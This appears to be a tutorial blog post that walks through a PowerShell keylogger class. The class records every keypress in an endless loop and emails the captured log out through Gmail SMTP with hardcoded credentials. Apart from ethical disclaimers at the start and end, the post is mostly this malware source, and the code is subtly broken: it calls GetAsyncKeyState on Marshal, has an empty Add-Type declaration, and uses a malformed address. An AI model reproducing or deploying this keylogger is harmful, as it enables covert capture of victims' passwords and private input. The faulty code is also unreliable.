Understanding a PowerShell Keylogger Script

In this exploration, we delve into a PowerShell script that simulates a basic keylogger. Before delving into the code, it's essential to emphasize the ethical and legal implications of creating keyloggers. The use of such tools without explicit consent is not only unethical but may also be illegal. It's crucial to ensure compliance with privacy and security standards and obtain proper authorization.

Now, let's dissect the script:

1. Loading Necessary Assemblies:

Add-Type @"
    using System;
    using System.Runtime.InteropServices;
"@

This part introduces the necessary .NET assemblies - System and System.Runtime.InteropServices. These assemblies enable access to .NET types and facilitate the invocation of functions from unmanaged code.

2. KeyLogger Class:

class KeyLogger {
    # Properties
    [string]$log = "Key started"
    [int]$interval
    [string]$username
    [string]$password
    [string]$email

    # Constructor
    KeyLogger([int]$time_interval, [string]$email, [string]$username, [string]$password) {
        # Initialization
        $this.interval = $time_interval
        $this.username = $username
        $this.password = $password
        $this.email = $email
    }

    # Method to start keylogging
    [void]Start() {
        while ($true) {
            $this.Report()
            Start-Sleep -Milliseconds $this.interval
        }
    }

    # Method to append content to the log
    [void]AppendToLog([string]$content) {
        $this.log += $content
    }

    # Method to report key presses
    [void]Report() {
        for ($key = 1; $key -le 255; $key++) {
            $state = [System.Runtime.InteropServices.Marshal]::GetAsyncKeyState($key)
            if ($state -eq -32767) {
                $currentKey = [char]$key
                $this.AppendToLog($currentKey)
            }
        }

        if ($this.log.Length -gt 0) {
            $this.SendEmail("`n`n" + $this.log)
            $this.log = ""
        }
    }

    # Method to send log content via email
    [void]SendEmail([string]$message) {
        $smtpServer = "smtp.gmail.com"
        $smtpPort = 587
        $smtp = New-Object Net.Mail.SmtpClient($smtpServer, $smtpPort)
        $smtp.EnableSsl = $true
        $smtp.Credentials = New-Object Net.NetworkCredential($this.username, $this.password)

        $smtp.Send($this.email, $this.email, $message)
    }
}

This section defines the KeyLogger class. It encapsulates properties for log storage, interval duration, email credentials, and methods for starting the keylogging process, appending to the log, reporting key presses, and sending the log via email.

3. Script Execution:

if ($MyInvocation.ScriptName -eq $null) {
    $kl = New-Object KeyLogger -ArgumentList 120, 'no-reply@Taylor.ChristianNewsome@OWASP.org', '[Hello]', '[Hello]'
    $kl.Start()
}


This part checks if the script is run directly and, if so, creates an instance of the KeyLogger class with specific parameters and starts the keylogging loop.

Remember, the primary intention here is educational, and ethical considerations should always guide the use and development of such scripts. Always prioritize privacy and adhere to legal standards when dealing with sensitive information.
